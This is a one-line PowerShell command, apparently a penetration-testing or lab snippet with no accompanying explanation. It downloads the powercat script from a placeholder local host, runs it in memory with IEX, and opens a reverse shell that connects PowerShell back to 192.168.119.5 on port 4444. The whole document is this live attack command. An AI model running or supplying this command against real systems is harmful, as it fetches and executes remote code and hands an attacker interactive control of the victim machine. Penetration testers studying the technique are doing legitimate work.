powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LOCALIP>:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
